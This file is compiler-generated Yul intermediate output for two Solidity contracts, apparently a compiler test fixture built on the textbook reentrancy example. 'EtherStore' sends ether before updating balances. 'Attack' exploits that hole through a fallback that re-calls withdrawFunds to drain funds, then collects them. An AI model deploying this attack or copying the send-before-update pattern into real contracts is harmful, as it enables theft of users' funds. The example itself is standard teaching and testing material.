object "Attack_76" {
    code {
        mstore(64, 128)
        if callvalue() { revert(0, 0) }

        let _1 := copy_arguments_for_constructor_16_object_Attack_76()
        constructor_Attack_76(_1)

        codecopy(0, dataoffset("Attack_76_deployed"), datasize("Attack_76_deployed"))

        return(0, datasize("Attack_76_deployed"))

        function abi_decode_t_address_fromMemory(offset, end) -> value {
            value := mload(offset)
            validator_revert_t_address(value)
        }

        function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {
            if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }

            {
                let offset := 0
                value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)
            }

        }

        function allocateMemory(size) -> memPtr {
            memPtr := mload(64)
            let newFreePtr := add(memPtr, size)
            // protect against overflow
            if or(gt(newFreePtr, 0xffffffffffffffff), lt(newFreePtr, memPtr)) { revert(0, 0) }
            mstore(64, newFreePtr)
        }

        function cleanup_t_address(value) -> cleaned {
            cleaned := cleanup_t_uint160(value)
        }

        function cleanup_t_uint160(value) -> cleaned {
            cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)
        }

        function constructor_Attack_76(vloc__etherStoreAddress_6) {

            let _2 := vloc__etherStoreAddress_6
            let expr_11 := _2
            let expr_12_address := convert_t_address_to_t_contract$_EtherStore_$164(expr_11)
            update_storage_value_offset_0t_contract$_EtherStore_$164(0x00, expr_12_address)
            let expr_13_address := expr_12_address

        }

        function convert_t_address_to_t_contract$_EtherStore_$164(value) -> converted {
            converted := convert_t_uint160_to_t_contract$_EtherStore_$164(value)
        }

        function convert_t_uint160_to_t_contract$_EtherStore_$164(value) -> converted {
            converted := cleanup_t_uint160(value)
        }

        function copy_arguments_for_constructor_16_object_Attack_76() -> ret_param_0 {
            let programSize := datasize("Attack_76")
            let argSize := sub(codesize(), programSize)

            let memoryDataOffset := allocateMemory(argSize)
            codecopy(memoryDataOffset, programSize, argSize)

            ret_param_0 := abi_decode_tuple_t_address_fromMemory(memoryDataOffset, add(memoryDataOffset, argSize))
        }

        function prepare_store_t_contract$_EtherStore_$164(value) -> ret {
            ret := value
        }

        function shift_left_0(value) -> newValue {
            newValue :=

            shl(0, value)

        }

        function update_byte_slice_20_shift_0(value, toInsert) -> result {
            let mask := 0xffffffffffffffffffffffffffffffffffffffff
            toInsert := shift_left_0(toInsert)
            value := and(value, not(mask))
            result := or(value, and(toInsert, mask))
        }

        function update_storage_value_offset_0t_contract$_EtherStore_$164(slot, value) {
            sstore(slot, update_byte_slice_20_shift_0(sload(slot), prepare_store_t_contract$_EtherStore_$164(value)))
        }

        function validator_revert_t_address(value) {
            if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }
        }

    }
    object "Attack_76_deployed" {
        code {
            mstore(64, 128)

            if iszero(lt(calldatasize(), 4))
            {
                let selector := shift_right_224_unsigned(calldataload(0))
                switch selector

                case 0x6289d385
                {
                    // pwnEtherStore()

                    abi_decode_tuple_(4, calldatasize())
                    fun_pwnEtherStore_40()
                    let memPos := allocateMemory(0)
                    let memEnd := abi_encode_tuple__to__fromStack(memPos  )
                    return(memPos, sub(memEnd, memPos))
                }

                case 0xacd2e6e5
                {
                    // etherStore()
                    if callvalue() { revert(0, 0) }
                    abi_decode_tuple_(4, calldatasize())
                    let ret_0 :=  getter_fun_etherStore_4()
                    let memPos := allocateMemory(0)
                    let memEnd := abi_encode_tuple_t_contract$_EtherStore_$164__to_t_contract$_EtherStore_$164__fromStack(memPos , ret_0)
                    return(memPos, sub(memEnd, memPos))
                }

                case 0xff11e1db
                {
                    // collectEther()
                    if callvalue() { revert(0, 0) }
                    abi_decode_tuple_(4, calldatasize())
                    fun_collectEther_56()
                    let memPos := allocateMemory(0)
                    let memEnd := abi_encode_tuple__to__fromStack(memPos  )
                    return(memPos, sub(memEnd, memPos))
                }

                default {}
            }
            if iszero(calldatasize()) {  }
            if callvalue() { revert(0, 0) }fun__75() stop()

            function abi_decode_tuple_(headStart, dataEnd)   {
                if slt(sub(dataEnd, headStart), 0) { revert(0, 0) }

            }

            function abi_decode_tuple__fromMemory(headStart, dataEnd)   {
                if slt(sub(dataEnd, headStart), 0) { revert(0, 0) }

            }

            function abi_encode_t_contract$_EtherStore_$164_to_t_address_fromStack(value, pos) {
                mstore(pos, convert_t_contract$_EtherStore_$164_to_t_address(value))
            }

            function abi_encode_t_rational_1000000000000000000_by_1_to_t_uint256_fromStack(value, pos) {
                mstore(pos, convert_t_rational_1000000000000000000_by_1_to_t_uint256(value))
            }

            function abi_encode_tuple__to__fromStack(headStart ) -> tail {
                tail := add(headStart, 0)

            }

            function abi_encode_tuple_t_contract$_EtherStore_$164__to_t_contract$_EtherStore_$164__fromStack(headStart , value0) -> tail {
                tail := add(headStart, 32)

                abi_encode_t_contract$_EtherStore_$164_to_t_address_fromStack(value0,  add(headStart, 0))

            }

            function abi_encode_tuple_t_rational_1000000000000000000_by_1__to_t_uint256__fromStack(headStart , value0) -> tail {
                tail := add(headStart, 32)

                abi_encode_t_rational_1000000000000000000_by_1_to_t_uint256_fromStack(value0,  add(headStart, 0))

            }

            function allocateMemory(size) -> memPtr {
                memPtr := mload(64)
                let newFreePtr := add(memPtr, size)
                // protect against overflow
                if or(gt(newFreePtr, 0xffffffffffffffff), lt(newFreePtr, memPtr)) { revert(0, 0) }
                mstore(64, newFreePtr)
            }

            function cleanup_from_storage_split_t_contract$_EtherStore_$164(value) -> cleaned {
                cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)
            }

            function cleanup_from_storage_t_contract$_EtherStore_$164(value) -> cleaned {
                cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)
            }

            function cleanup_t_uint160(value) -> cleaned {
                cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)
            }

            function cleanup_t_uint256(value) -> cleaned {
                cleaned := value
            }

            function convert_t_address_payable_to_t_address(value) -> converted {
                converted := convert_t_uint160_to_t_address(value)
            }

            function convert_t_contract$_Attack_$76_to_t_address(value) -> converted {
                converted := convert_t_contract$_Attack_$76_to_t_uint160(value)
            }

            function convert_t_contract$_Attack_$76_to_t_uint160(value) -> converted {
                converted := cleanup_t_uint160(value)
            }

            function convert_t_contract$_EtherStore_$164_to_t_address(value) -> converted {
                converted := convert_t_contract$_EtherStore_$164_to_t_uint160(value)
            }

            function convert_t_contract$_EtherStore_$164_to_t_uint160(value) -> converted {
                converted := cleanup_t_uint160(value)
            }

            function convert_t_rational_1000000000000000000_by_1_to_t_uint256(value) -> converted {
                converted := cleanup_t_uint256(value)
            }

            function convert_t_uint160_to_t_address(value) -> converted {
                converted := convert_t_uint160_to_t_uint160(value)
            }

            function convert_t_uint160_to_t_uint160(value) -> converted {
                converted := cleanup_t_uint160(value)
            }

            function extract_from_storage_value_dynamicsplit_t_contract$_EtherStore_$164(slot_value, offset) -> value {
                value := cleanup_from_storage_split_t_contract$_EtherStore_$164(shift_right_unsigned_dynamic(mul(offset, 8), slot_value))
            }

            function extract_from_storage_value_offset_0t_contract$_EtherStore_$164(slot_value) -> value {
                value := cleanup_from_storage_t_contract$_EtherStore_$164(shift_right_0_unsigned(slot_value))
            }

            function fun__75() {

                let _11_address := read_from_storage_offset_0_t_contract$_EtherStore_$164(0x00)
                let expr_61_address := _11_address
                let expr_62 := convert_t_contract$_EtherStore_$164_to_t_address(expr_61_address)
                let expr_63 := balance(expr_62)
                let expr_64 := 0x0de0b6b3a7640000
                let expr_65 := gt(cleanup_t_uint256(expr_63), convert_t_rational_1000000000000000000_by_1_to_t_uint256(expr_64))
                if expr_65 {
                    let _12_address := read_from_storage_offset_0_t_contract$_EtherStore_$164(0x00)
                    let expr_66_address := _12_address
                    let expr_68_address := convert_t_contract$_EtherStore_$164_to_t_address(expr_66_address)
                    let expr_68_functionSelector := 0x155dd5ee
                    let expr_69 := 0x0de0b6b3a7640000

                    if iszero(extcodesize(expr_68_address)) { revert(0, 0) }

                    // storage for arguments and returned data
                    let _13 := mload(64)
                    mstore(_13, shift_left_224(expr_68_functionSelector))
                    let _14 := abi_encode_tuple_t_rational_1000000000000000000_by_1__to_t_uint256__fromStack(add(_13, 4) , expr_69)

                    let _15 := call(gas(), expr_68_address,  0,  _13, sub(_14, _13), _13, 0)

                    if iszero(_15) { revert_forward_1() }

                    if _15 {

                        // update freeMemoryPointer according to dynamic return size
                        mstore(64, add(_13, round_up_to_mul_of_32(returndatasize())))

                        // decode return parameters from external try-call into retVars
                        abi_decode_tuple__fromMemory(_13, add(_13, returndatasize()))
                    }
                }

            }

            function fun_collectEther_56() {

                let expr_46 := caller()
                let expr_47_address := convert_t_address_payable_to_t_address(expr_46)
                let expr_50_address := address()
                let expr_51 := convert_t_contract$_Attack_$76_to_t_address(expr_50_address)
                let expr_52 := balance(expr_51)

                let _9 := 0
                if iszero(expr_52) { _9 := 2300 }
                let _10 := call(_9, expr_47_address, expr_52, 0, 0, 0, 0)

                if iszero(_10) { revert_forward_1() }

            }

            function fun_pwnEtherStore_40() {

                let expr_21 := callvalue()
                let expr_22 := 0x0de0b6b3a7640000
                let expr_23 := iszero(lt(cleanup_t_uint256(expr_21), convert_t_rational_1000000000000000000_by_1_to_t_uint256(expr_22)))
                require_helper(expr_23)
                let _1_address := read_from_storage_offset_0_t_contract$_EtherStore_$164(0x00)
                let expr_26_address := _1_address
                let expr_28_address := convert_t_contract$_EtherStore_$164_to_t_address(expr_26_address)
                let expr_28_functionSelector := 0xe2c41dbc
                let expr_29 := 0x0de0b6b3a7640000
                let expr_30_address := expr_28_address
                let expr_30_functionSelector := expr_28_functionSelector
                let expr_30_value := convert_t_rational_1000000000000000000_by_1_to_t_uint256(expr_29)

                if iszero(extcodesize(expr_30_address)) { revert(0, 0) }

                // storage for arguments and returned data
                let _2 := mload(64)
                mstore(_2, shift_left_224(expr_30_functionSelector))
                let _3 := abi_encode_tuple__to__fromStack(add(_2, 4) )

                let _4 := call(gas(), expr_30_address,  expr_30_value,  _2, sub(_3, _2), _2, 0)

                if iszero(_4) { revert_forward_1() }

                if _4 {

                    // update freeMemoryPointer according to dynamic return size
                    mstore(64, add(_2, round_up_to_mul_of_32(returndatasize())))

                    // decode return parameters from external try-call into retVars
                    abi_decode_tuple__fromMemory(_2, add(_2, returndatasize()))
                }
                let _5_address := read_from_storage_offset_0_t_contract$_EtherStore_$164(0x00)
                let expr_33_address := _5_address
                let expr_35_address := convert_t_contract$_EtherStore_$164_to_t_address(expr_33_address)
                let expr_35_functionSelector := 0x155dd5ee
                let expr_36 := 0x0de0b6b3a7640000

                if iszero(extcodesize(expr_35_address)) { revert(0, 0) }

                // storage for arguments and returned data
                let _6 := mload(64)
                mstore(_6, shift_left_224(expr_35_functionSelector))
                let _7 := abi_encode_tuple_t_rational_1000000000000000000_by_1__to_t_uint256__fromStack(add(_6, 4) , expr_36)

                let _8 := call(gas(), expr_35_address,  0,  _6, sub(_7, _6), _6, 0)

                if iszero(_8) { revert_forward_1() }

                if _8 {

                    // update freeMemoryPointer according to dynamic return size
                    mstore(64, add(_6, round_up_to_mul_of_32(returndatasize())))

                    // decode return parameters from external try-call into retVars
                    abi_decode_tuple__fromMemory(_6, add(_6, returndatasize()))
                }

            }

            function getter_fun_etherStore_4() -> ret_address {

                let slot := 0
                let offset := 0

                ret_address := read_from_storage_dynamicsplit__t_contract$_EtherStore_$164(slot, offset)

            }

            function read_from_storage_dynamicsplit__t_contract$_EtherStore_$164(slot, offset) -> value {
                value := extract_from_storage_value_dynamicsplit_t_contract$_EtherStore_$164(sload(slot), offset)
            }

            function read_from_storage_offset_0_t_contract$_EtherStore_$164(slot) -> value {
                value := extract_from_storage_value_offset_0t_contract$_EtherStore_$164(sload(slot))
            }

            function require_helper(condition) {
                if iszero(condition) { revert(0, 0) }
            }

            function revert_forward_1() {
                returndatacopy(0, 0, returndatasize())
                revert(0, returndatasize())
            }

            function round_up_to_mul_of_32(value) -> result {
                result := and(add(value, 31), not(31))
            }

            function shift_left_224(value) -> newValue {
                newValue :=

                shl(224, value)

            }

            function shift_right_0_unsigned(value) -> newValue {
                newValue :=

                shr(0, value)

            }

            function shift_right_224_unsigned(value) -> newValue {
                newValue :=

                shr(224, value)

            }

            function shift_right_unsigned_dynamic(bits, value) -> newValue {
                newValue :=

                shr(bits, value)

            }

        }

    }

}


IR:
/*******************************************************
 *                       WARNING                       *
 *  Solidity to Yul compilation is still EXPERIMENTAL  *
 *       It can result in LOSS OF FUNDS or worse       *
 *                !USE AT YOUR OWN RISK!               *
 *******************************************************/


object "EtherStore_164" {
    code {
        mstore(64, 128)
        if callvalue() { revert(0, 0) }

        constructor_EtherStore_164()

        codecopy(0, dataoffset("EtherStore_164_deployed"), datasize("EtherStore_164_deployed"))

        return(0, datasize("EtherStore_164_deployed"))

        function constructor_EtherStore_164() {

            let expr_80 := 0x0de0b6b3a7640000
            update_storage_value_offset_0t_uint256(0x00, expr_80)

        }

        function prepare_store_t_uint256(value) -> ret {
            ret := value
        }

        function shift_left_0(value) -> newValue {
            newValue :=

            shl(0, value)

        }

        function update_byte_slice_32_shift_0(value, toInsert) -> result {
            let mask := 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
            toInsert := shift_left_0(toInsert)
            value := and(value, not(mask))
            result := or(value, and(toInsert, mask))
        }

        function update_storage_value_offset_0t_uint256(slot, value) {
            sstore(slot, update_byte_slice_32_shift_0(sload(slot), prepare_store_t_uint256(value)))
        }

    }
    object "EtherStore_164_deployed" {
        code {
            mstore(64, 128)

            if iszero(lt(calldatasize(), 4))
            {
                let selector := shift_right_224_unsigned(calldataload(0))
                switch selector

                case 0x1031ec31
                {
                    // lastWithdrawTime(address)
                    if callvalue() { revert(0, 0) }
                    let param_0 :=  abi_decode_tuple_t_address(4, calldatasize())
                    let ret_0 :=  getter_fun_lastWithdrawTime_85(param_0)
                    let memPos := allocateMemory(0)
                    let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                    return(memPos, sub(memEnd, memPos))
                }

                case 0x155dd5ee
                {
                    // withdrawFunds(uint256)
                    if callvalue() { revert(0, 0) }
                    let param_0 :=  abi_decode_tuple_t_uint256(4, calldatasize())
                    fun_withdrawFunds_163(param_0)
                    let memPos := allocateMemory(0)
                    let memEnd := abi_encode_tuple__to__fromStack(memPos  )
                    return(memPos, sub(memEnd, memPos))
                }

                case 0x27e235e3
                {
                    // balances(address)
                    if callvalue() { revert(0, 0) }
                    let param_0 :=  abi_decode_tuple_t_address(4, calldatasize())
                    let ret_0 :=  getter_fun_balances_89(param_0)
                    let memPos := allocateMemory(0)
                    let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                    return(memPos, sub(memEnd, memPos))
                }

                case 0x7ddfe78d
                {
                    // withdrawalLimit()
                    if callvalue() { revert(0, 0) }
                    abi_decode_tuple_(4, calldatasize())
                    let ret_0 :=  getter_fun_withdrawalLimit_81()
                    let memPos := allocateMemory(0)
                    let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                    return(memPos, sub(memEnd, memPos))
                }

                case 0xe2c41dbc
                {
                    // depositFunds()

                    abi_decode_tuple_(4, calldatasize())
                    fun_depositFunds_101()
                    let memPos := allocateMemory(0)
                    let memEnd := abi_encode_tuple__to__fromStack(memPos  )
                    return(memPos, sub(memEnd, memPos))
                }

                default {}
            }
            if iszero(calldatasize()) {  }
            revert(0, 0)

            function abi_decode_t_address(offset, end) -> value {
                value := calldataload(offset)
                validator_revert_t_address(value)
            }

            function abi_decode_t_uint256(offset, end) -> value {
                value := calldataload(offset)
                validator_revert_t_uint256(value)
            }

            function abi_decode_tuple_(headStart, dataEnd)   {
                if slt(sub(dataEnd, headStart), 0) { revert(0, 0) }

            }

            function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {
                if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }

                {
                    let offset := 0
                    value0 := abi_decode_t_address(add(headStart, offset), dataEnd)
                }

            }

            function abi_decode_tuple_t_uint256(headStart, dataEnd) -> value0 {
                if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }

                {
                    let offset := 0
                    value0 := abi_decode_t_uint256(add(headStart, offset), dataEnd)
                }

            }

            function abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos) -> end {
                pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, 0)

                end := add(pos, 0)
            }

            function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {
                mstore(pos, cleanup_t_uint256(value))
            }

            function abi_encode_tuple__to__fromStack(headStart ) -> tail {
                tail := add(headStart, 0)

            }

            function abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack(pos ) -> end {

                pos := abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack( pos)

                end := pos
            }

            function abi_encode_tuple_t_uint256__to_t_uint256__fromStack(headStart , value0) -> tail {
                tail := add(headStart, 32)

                abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))

            }

            function allocateMemory(size) -> memPtr {
                memPtr := mload(64)
                let newFreePtr := add(memPtr, size)
                // protect against overflow
                if or(gt(newFreePtr, 0xffffffffffffffff), lt(newFreePtr, memPtr)) { revert(0, 0) }
                mstore(64, newFreePtr)
            }

            function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {
                updated_pos := pos
            }

            function checked_add_t_uint256(x, y) -> sum {
                x := cleanup_t_uint256(x)
                y := cleanup_t_uint256(y)

                // overflow, if x > (maxValue - y)
                if gt(x, sub(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, y)) { revert(0, 0) }

                sum := add(x, y)
            }

            function checked_sub_t_uint256(x, y) -> diff {
                x := cleanup_t_uint256(x)
                y := cleanup_t_uint256(y)

                if lt(x, y) { revert(0, 0) }

                diff := sub(x, y)
            }

            function cleanup_from_storage_split_t_uint256(value) -> cleaned {
                cleaned := value
            }

            function cleanup_from_storage_t_uint256(value) -> cleaned {
                cleaned := value
            }

            function cleanup_t_address(value) -> cleaned {
                cleaned := cleanup_t_uint160(value)
            }

            function cleanup_t_uint160(value) -> cleaned {
                cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)
            }

            function cleanup_t_uint256(value) -> cleaned {
                cleaned := value
            }

            function convert_t_address_payable_to_t_address(value) -> converted {
                converted := convert_t_uint160_to_t_address(value)
            }

            function convert_t_address_to_t_address(value) -> converted {
                converted := convert_t_uint160_to_t_address(value)
            }

            function convert_t_rational_604800_by_1_to_t_uint256(value) -> converted {
                converted := cleanup_t_uint256(value)
            }

            function convert_t_uint160_to_t_address(value) -> converted {
                converted := convert_t_uint160_to_t_uint160(value)
            }

            function convert_t_uint160_to_t_uint160(value) -> converted {
                converted := cleanup_t_uint160(value)
            }

            function extract_from_storage_value_dynamicsplit_t_uint256(slot_value, offset) -> value {
                value := cleanup_from_storage_split_t_uint256(shift_right_unsigned_dynamic(mul(offset, 8), slot_value))
            }

            function extract_from_storage_value_offset_0t_uint256(slot_value) -> value {
                value := cleanup_from_storage_t_uint256(shift_right_0_unsigned(slot_value))
            }

            function extract_returndata() -> data {

                switch returndatasize()
                case 0 {
                    data := zero_value_for_split_t_bytes_memory_ptr()
                }
                default {
                    // allocate some memory into data of size returndatasize() + PADDING
                    data := allocateMemory(round_up_to_mul_of_32(add(returndatasize(), 0x20)))

                    // store array length into the front
                    mstore(data, returndatasize())

                    // append to data
                    returndatacopy(add(data, 0x20), 0, returndatasize())
                }

            }

            function fun_depositFunds_101() {

                let expr_97 := callvalue()
                let _1 := 0x02
                let expr_92 := _1
                let expr_94 := caller()
                let _2 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address_payable(expr_92,expr_94)
                let _3 := read_from_storage_offset_0_t_uint256(_2)
                expr_97 := checked_add_t_uint256(_3, expr_97)
                update_storage_value_offset_0t_uint256(_2, expr_97)
                let expr_98 := expr_97

            }

            function fun_withdrawFunds_163(vloc__weiToWithdraw_103) {

                let _4 := 0x02
                let expr_107 := _4
                let expr_109 := caller()
                let _5 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address_payable(expr_107,expr_109)
                let _6 := read_from_storage_offset_0_t_uint256(_5)
                let expr_110 := _6
                let _7 := vloc__weiToWithdraw_103
                let expr_111 := _7
                let expr_112 := iszero(lt(cleanup_t_uint256(expr_110), cleanup_t_uint256(expr_111)))
                require_helper(expr_112)
                let _8 := vloc__weiToWithdraw_103
                let expr_116 := _8
                let _9 := read_from_storage_offset_0_t_uint256(0x00)
                let expr_117 := _9
                let expr_118 := iszero(gt(cleanup_t_uint256(expr_116), cleanup_t_uint256(expr_117)))
                require_helper(expr_118)
                let expr_123 := timestamp()
                let _10 := 0x01
                let expr_124 := _10
                let expr_126 := caller()
                let _11 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address_payable(expr_124,expr_126)
                let _12 := read_from_storage_offset_0_t_uint256(_11)
                let expr_127 := _12
                let expr_128 := 0x093a80
                let expr_129 := checked_add_t_uint256(expr_127, convert_t_rational_604800_by_1_to_t_uint256(expr_128))

                let expr_130 := iszero(lt(cleanup_t_uint256(expr_123), cleanup_t_uint256(expr_129)))
                require_helper(expr_130)
                let expr_136 := caller()
                let expr_137_address := convert_t_address_payable_to_t_address(expr_136)
                let _13 := vloc__weiToWithdraw_103
                let expr_138 := _13
                let expr_139_address := expr_137_address
                let expr_139_value := expr_138

                let _14 := mload(64)
                let _15 := sub(abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack(_14  ), _14)

                let expr_141_component_1 := call(gas(), expr_139_address,  expr_139_value,  _14, _15, 0, 0)

                let expr_141_component_2_mpos := extract_returndata()

                let vloc_success_134 := expr_141_component_1
                let _16 := vloc_success_134
                let expr_144 := _16
                require_helper(expr_144)
                let _17 := vloc__weiToWithdraw_103
                let expr_151 := _17
                let _18 := 0x02
                let expr_147 := _18
                let expr_149 := caller()
                let _19 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address_payable(expr_147,expr_149)
                let _20 := read_from_storage_offset_0_t_uint256(_19)
                expr_151 := checked_sub_t_uint256(_20, expr_151)
                update_storage_value_offset_0t_uint256(_19, expr_151)
                let expr_152 := expr_151
                let expr_159 := timestamp()
                let _21 := 0x01
                let expr_154 := _21
                let expr_156 := caller()
                let _22 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address_payable(expr_154,expr_156)
                update_storage_value_offset_0t_uint256(_22, expr_159)
                let expr_160 := expr_159

            }

            function getter_fun_balances_89(key_0) -> ret {

                let slot := 2
                let offset := 0

                slot := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(slot, key_0)

                ret := read_from_storage_dynamicsplit__t_uint256(slot, offset)

            }

            function getter_fun_lastWithdrawTime_85(key_0) -> ret {

                let slot := 1
                let offset := 0

                slot := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(slot, key_0)

                ret := read_from_storage_dynamicsplit__t_uint256(slot, offset)

            }

            function getter_fun_withdrawalLimit_81() -> ret {

                let slot := 0
                let offset := 0

                ret := read_from_storage_dynamicsplit__t_uint256(slot, offset)

            }

            function mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(slot , key) -> dataSlot {
                mstore(0, convert_t_address_to_t_address(key))
                mstore(0x20, slot)
                dataSlot := keccak256(0, 0x40)
            }

            function mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address_payable(slot , key) -> dataSlot {
                mstore(0, convert_t_address_payable_to_t_address(key))
                mstore(0x20, slot)
                dataSlot := keccak256(0, 0x40)
            }

            function prepare_store_t_uint256(value) -> ret {
                ret := value
            }

            function read_from_storage_dynamicsplit__t_uint256(slot, offset) -> value {
                value := extract_from_storage_value_dynamicsplit_t_uint256(sload(slot), offset)
            }

            function read_from_storage_offset_0_t_uint256(slot) -> value {
                value := extract_from_storage_value_offset_0t_uint256(sload(slot))
            }

            function require_helper(condition) {
                if iszero(condition) { revert(0, 0) }
            }

            function round_up_to_mul_of_32(value) -> result {
                result := and(add(value, 31), not(31))
            }

            function shift_left_0(value) -> newValue {
                newValue :=

                shl(0, value)

            }

            function shift_right_0_unsigned(value) -> newValue {
                newValue :=

                shr(0, value)

            }

            function shift_right_224_unsigned(value) -> newValue {
                newValue :=

                shr(224, value)

            }

            function shift_right_unsigned_dynamic(bits, value) -> newValue {
                newValue :=

                shr(bits, value)

            }

            function update_byte_slice_32_shift_0(value, toInsert) -> result {
                let mask := 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
                toInsert := shift_left_0(toInsert)
                value := and(value, not(mask))
                result := or(value, and(toInsert, mask))
            }

            function update_storage_value_offset_0t_uint256(slot, value) {
                sstore(slot, update_byte_slice_32_shift_0(sload(slot), prepare_store_t_uint256(value)))
            }

            function validator_revert_t_address(value) {
                if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }
            }

            function validator_revert_t_uint256(value) {
                if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }
            }

            function zero_value_for_split_t_bytes_memory_ptr() -> ret {
                ret := 96
            }

        }

    }

}


